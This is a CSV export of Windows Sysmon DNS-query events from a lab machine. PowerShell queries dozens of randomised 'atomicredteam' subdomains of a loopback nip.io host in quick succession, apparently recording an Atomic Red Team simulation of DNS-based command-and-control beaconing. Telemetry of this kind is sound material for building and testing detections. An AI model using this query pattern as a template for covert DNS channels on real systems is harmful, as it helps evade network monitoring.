"2025-12-22 13:58:29.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165777,"Query: atomicredteam-150017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.229","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165778,"Query: atomicredteam-838757.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.273","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165779,"Query: atomicredteam-906545.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.926 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165780,"Query: atomicredteam-251185.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.926 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165781,"Query: atomicredteam-336520.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.682","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.926 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165782,"Query: atomicredteam-288940.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:29.926 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165783,"Query: atomicredteam-353959.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.769","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.929 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165784,"Query: atomicredteam-515136.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165785,"Query: atomicredteam-405714.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.852","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165786,"Query: atomicredteam-321842.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.896","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165787,"Query: atomicredteam-316789.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:29.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165788,"Query: atomicredteam-290625.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.110","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165789,"Query: atomicredteam-874977.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.153","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.930 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165790,"Query: atomicredteam-389673.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.196","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165791,"Query: atomicredteam-803929.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165792,"Query: atomicredteam-667531.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.284","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165793,"Query: atomicredteam-837811.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165794,"Query: atomicredteam-33430.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.504","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165795,"Query: atomicredteam-292125.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.546","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165796,"Query: atomicredteam-861884.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.586","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165797,"Query: atomicredteam-184759.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.628","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165798,"Query: atomicredteam-286764.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:30.931 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165799,"Query: atomicredteam-541180.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.713","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165800,"Query: atomicredteam-549568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.756","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165801,"Query: atomicredteam-511007.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.926","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165802,"Query: atomicredteam-764524.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:30.970","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165803,"Query: atomicredteam-167960.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.013","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165804,"Query: atomicredteam-679782.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.056","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165805,"Query: atomicredteam-834110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.100","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165806,"Query: atomicredteam-628552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.144","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165807,"Query: atomicredteam-84129.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.187","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165808,"Query: atomicredteam-704151.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.229","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165809,"Query: atomicredteam-370486.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.273","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165810,"Query: atomicredteam-578485.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165811,"Query: atomicredteam-39676.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165812,"Query: atomicredteam-120132.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.404","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165813,"Query: atomicredteam-91627.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165814,"Query: atomicredteam-841297.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165815,"Query: atomicredteam-491326.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.530","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165816,"Query: atomicredteam-441199.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.573","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165817,"Query: atomicredteam-926953.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.616","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165818,"Query: atomicredteam-344605.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.660","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165819,"Query: atomicredteam-284044.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.705","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165820,"Query: atomicredteam-685967.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.750","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:31.944 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165821,"Query: atomicredteam-311626.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.792","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165822,"Query: atomicredteam-89567.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.836","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165823,"Query: atomicredteam-818149.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.880","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165824,"Query: atomicredteam-225533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.922","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:32.943 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165825,"Query: atomicredteam-728682.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:31.964","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
